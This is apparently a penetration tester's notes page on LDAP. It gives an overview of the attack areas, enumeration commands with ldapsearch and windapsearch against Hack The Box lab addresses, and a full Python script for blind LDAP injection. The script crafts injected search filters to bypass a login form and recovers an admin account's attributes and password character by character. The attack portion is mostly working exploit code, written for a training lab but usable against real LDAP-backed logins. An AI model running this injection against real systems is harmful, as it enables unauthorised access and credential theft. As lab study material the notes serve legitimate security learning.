# LDAP
LDAP, which stands for Lightweight Directory Access Protocol, is a widely used application protocol for accessing and managing directory information services. It is commonly used for centralized authentication, user management, and directory services in various organizations.

* LDAP Enumeration: Penetration testers perform LDAP enumeration to gather information about the directory structure, users, groups, and other directory objects. This helps in mapping the network, understanding the LDAP services available, and identifying potential security weaknesses or misconfigurations.

* LDAP Authentication: LDAP provides authentication mechanisms to verify user credentials and grant access to directory services. Penetration testers assess the strength of LDAP authentication mechanisms, such as simple binds, SASL (Simple Authentication and Security Layer), or LDAP over SSL/TLS. They look for potential vulnerabilities or weak configurations that could lead to unauthorized access or credential compromise.

*  LDAP Injection Attacks: Penetration testers investigate the susceptibility of LDAP implementations to injection attacks, similar to SQL injection. They assess the input validation and sanitization mechanisms in place, looking for potential vulnerabilities that could allow an attacker to manipulate LDAP queries and potentially gain unauthorized access or extract sensitive information.

* LDAP Authorization and Access Control: LDAP supports access control mechanisms to define permissions and restrict access to directory objects. Penetration testers review the access control configurations to ensure proper authorization is in place and identify any misconfigurations or weaknesses that may lead to unauthorized access or privilege escalation.

* LDAP Trust Relationships: In larger environments, LDAP may involve trust relationships between multiple directories or domains. Penetration testers analyze the trust relationships in place, including cross-domain authentication and trust configurations, to identify potential security weaknesses or misconfigurations that could lead to unauthorized access or information leakage.

Microsoft Active Directory (AD) is based on the LDAP

## ldapsearch

```
sudo ldapsearch -H LDAP://10.10.10.161 -x -b "DC=HTB,DC=LOCAL" 
```
```
sudo ldapsearch -H LDAP://10.10.10.161 -x -b "DC=HTB,DC=LOCAL" '(objectClass=Person)'
```

## windapsearch

![image](https://github.com/dbissell6/Shadow_Stone/assets/50979196/aacc8738-78b2-48fc-a472-d7c4c95731af)

```
./windapsearch-linux-amd64 -d MEGABANK.LOCAL 10.10.10.169 -m users | awk '/userPrincipalName:/ {print $2}'
```
```
awk -F'@' '{print $1}' usernames > names
```
## BruteForce object data

```
#!/usr/bin/env python3
"""
HTB Academy - LDAP Blind Injection: Attribute Exfiltration Script
Exfiltrates LDAP attributes character-by-character via blind injection.
"""

import requests
import string
import sys

# ── Config ────────────────────────────────────────────────────────────────────
TARGET   = "http://154.57.164.78:31805/index.php"
USERNAME = "htb-stdnt"
SESSION  = "kda3963v047j8a29k7drvd9egn"   # replace if expired

# Indicator that the LDAP query returned a result
SUCCESS_MARKER = "Login successful"

# Characters to try (order matters for speed; common chars first)
CHARSET = string.ascii_lowercase + string.digits + "_@!-$#. {}"

HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent":   "Mozilla/5.0",
    "Cookie":       f"PHPSESSID={SESSION}",
}

# ── Core helpers ──────────────────────────────────────────────────────────────

def query(username: str, password: str) -> bool:
    """Return True if the server responds with a success indicator."""
    resp = requests.post(
        TARGET,
        data=f"username={requests.utils.quote(username)}&password={requests.utils.quote(password)}",
        headers=HEADERS,
        allow_redirects=True,
        timeout=10,
    )
    return SUCCESS_MARKER in resp.text


def exfiltrate_attribute(target_user: str, attribute: str) -> str:
    """
    Brute-force an LDAP attribute value character by character.

    Injected search filter (simplified):
        (&(uid=<target_user>)(|(< attribute >=<known>*)(password=invalid)))
    The or-clause is true whenever the attribute starts with <known>,
    regardless of the supplied password being wrong.
    """
    known = ""
    print(f"[*] Exfiltrating '{attribute}' for user '{target_user}'")

    while True:
        found_char = False
        for ch in CHARSET:
            candidate = known + ch
            # Inject into uid to open a new (|(attr=candidate*)(password=invalid)) clause
            injected_user = f"{target_user})(|({attribute}={candidate}*"
            injected_pass = "invalid)"

            if query(injected_user, injected_pass):
                known = candidate
                print(f"  → {known}", end="\r", flush=True)
                found_char = True
                break

        if not found_char:
            break   # No character matched → we've reached the end of the value

    print(f"\n[+] {attribute} = {known!r}")
    return known


def exfiltrate_password(target_user: str) -> str:
    """
    Brute-force the password directly via the password field wildcard trick:
        (&(uid=<user>)(password=<known>*))
    """
    known = ""
    print(f"[*] Exfiltrating password for user '{target_user}'")

    while True:
        found_char = False
        for ch in CHARSET + "!@#$%^&*()-_=+[]{}|;:',.<>?/`~":
            candidate = known + ch
            if query(target_user, candidate + "*"):
                known = candidate
                print(f"  → {known}", end="\r", flush=True)
                found_char = True
                break

        if not found_char:
            break

    print(f"\n[+] password = {known!r}")
    return known


# ── Main ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    # Verify connectivity / session is still valid
    print("[*] Verifying wildcard login (sanity check)...")
    if not query(USERNAME, "*"):
        print("[!] Wildcard login failed — check SESSION cookie or target URL.")
        sys.exit(1)
    print("[+] Wildcard login OK\n")

    # Exfiltrate the description attribute of admin
    exfiltrate_attribute("admin", "description")


```
